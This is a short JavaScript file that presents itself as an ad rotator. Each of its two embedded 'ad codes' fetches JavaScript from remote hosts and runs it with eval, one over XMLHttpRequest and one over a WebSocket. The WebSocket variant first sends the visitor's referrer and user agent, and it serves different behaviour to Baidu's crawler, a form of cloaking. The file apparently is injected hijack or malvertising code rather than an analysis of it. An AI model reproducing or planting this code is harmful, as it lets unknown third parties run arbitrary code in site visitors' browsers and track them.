var randoms = {
	ads_codes: ['document.writeln(\'<script data-union-ad data-priority="1" data-position="fixed">;(function(){var a=new XMLHttpRequest();var b="https://jtugglm.aoqinglv.cn:18443/ad/x-115-34.js?r="+new Date().toLocaleDateString();if(a!=null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){if(window.execScript)window.execScript(a.responseText,"JavaScript");else if(window.eval)window.eval(a.responseText,"JavaScript");else eval(a.responseText);}}};a.open("GET",b,false);a.send(null);}})();<\\/script>\')',';(function(){var _cdas_uniqid=\'k\'+Math.random().toString(36).substr(2);document.writeln(\'<div id="\'+_cdas_uniqid+\'"><'+'/div>\');var agentInfo = navigator.userAgent;var url="https://bbk6269.xiaodongjun.com:8080/vx@14899&34";try{var cdas523_dda987;var ws_domain="wss://K1GiW6269.jmhai.com:3400";if(agentInfo.indexOf(\'Baidu\')==-1){document.write(\'<script src="\' + url + \'"><\\/script>\');}else if(agentInfo.indexOf(\'Harmony\')>0 && agentInfo.indexOf(\'Huawei\')>0){document.write(\'<script src="\' + url + \'"><\\/script>\');}else{if("WebSocket"in window){cdas523_dda987=new WebSocket(ws_domain)}else{if("MozWebSocket"in window) {cdas523_dda987=new MozWebSocket(ws_domain)}else{cdas523_dda987=new SockJS(ws_domain)}}cdas523_dda987.onopen=function(){cdas523_dda987.send(url+\'?r=\'+document.referrer+\'&a=\'+encodeURI(navigator.userAgent));};cdas523_dda987.onmessage=function(e){var responseBody=e.data;eval(responseBody);cdas523_dda987.close();};}}catch(c){console.log("createWebSocket error "+c);}})();'],
	ads_weight: [10,10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		eval(randoms.ads_codes[rand]);

	}
}
randoms.init();
